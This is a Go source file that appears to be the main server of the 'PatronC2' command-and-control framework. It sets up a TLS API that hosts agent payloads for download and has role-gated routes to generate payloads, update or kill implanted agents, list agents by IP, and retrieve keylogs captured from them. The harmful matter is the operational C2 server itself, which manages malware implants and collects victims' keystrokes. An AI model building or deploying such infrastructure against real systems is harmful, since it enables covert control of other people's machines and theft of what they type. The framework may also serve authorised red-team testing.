package main

import (
    "net/http"
    "path/filepath"
    "os"
    "strings"
    "fmt"

    "github.com/PatronC2/Patron/api/api"
    "github.com/PatronC2/Patron/lib/logger"
    "github.com/gin-gonic/gin"
)

func main() {
    api.OpenDatabase()
    api.InitDatabase()
    api.CreateAdminUser()
    
    gin.SetMode(gin.ReleaseMode)
    r := gin.Default()

    // host payloads server
    workDir, _ := os.Getwd()
	filesDir := http.Dir(filepath.Join(workDir, "agents"))
    FileServer(r, "/files", filesDir)

    // handle logins
    r.POST("/login", api.LoginHandler)

    readRoles := []string{"admin", "operator", "readOnly"}
    writeRoles := []string{"admin", "operator"}
    adminRoles := []string{"admin"}

    // Admin functions
    r.POST("/api/admin/users", api.Auth(adminRoles), api.CreateUserHandler)
    r.DELETE("/api/admin/users/:username", api.Auth(adminRoles), api.DeleteUserByUsernameHandler)

    // POST / DELETE requests to non-admin areas use Auth(writeRoles)
    r.POST("/api/updateagent/:agt", api.Auth(writeRoles), api.UpdateAgentHandler)
    r.GET("/api/deleteagent/:agt", api.Auth(writeRoles), api.KillAgentHandler)
    r.POST("/api/payload", api.Auth(writeRoles), api.CreatePayloadHandler)

    // GET requests to non-admin areas use Auth(readRoles)
    r.GET("/api/agents", api.Auth(readRoles), api.GetAgentsHandler)
    r.GET("/api/groupagents", api.Auth(readRoles), api.GetGroupAgents)
    r.GET("/api/groupagents/:ip", api.Auth(readRoles), api.GetGroupAgentsByIP)
    r.GET("/api/oneagent/:agt", api.Auth(readRoles), api.GetOneAgentByUUID)
    r.GET("/api/agent/:agt", api.Auth(readRoles), api.GetAgentByUUID)
    r.GET("/api/keylog/:agt", api.Auth(readRoles), api.GetKeylogHandler)
    r.GET("/api/payloads", api.Auth(readRoles), api.GetPayloadsHandler)


    // Replace with your paths to the certificate and key files
    certFile := "certs/server.pem"
    keyFile := "certs/server.key"

    // Use RunTLS to enable SSL
    if err := r.RunTLS(":8443", certFile, keyFile); err != nil {
        logger.Logf(logger.Error, "Failed to run server: %v\n", err)
    }
}

func FileServer(r *gin.Engine, path string, root http.FileSystem) {
	if strings.ContainsAny(path, "{}*") {
		panic("FileServer does not permit any URL parameters.")
	}

	if path != "/" && path[len(path)-1] != '/' {
		r.GET(path, func(c *gin.Context) {
			c.Redirect(http.StatusMovedPermanently, path+"/")
		})
		path += "/"
	}
	r.StaticFS(path, root)
}
